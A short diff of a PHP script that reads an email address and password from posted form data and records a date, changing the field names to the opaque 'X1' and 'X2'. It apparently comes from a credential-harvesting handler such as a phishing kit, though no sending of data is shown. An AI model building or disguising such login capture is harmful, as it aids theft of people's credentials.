@@ -1,7 +1,7 @@
 <?php
 
-$email = $_POST['email'];
-$Password= $_POST['password'];
+$email = $_POST['X1'];
+$Password= $_POST['X2'];
 
 
 $date = gmdate ("d-n-Y");
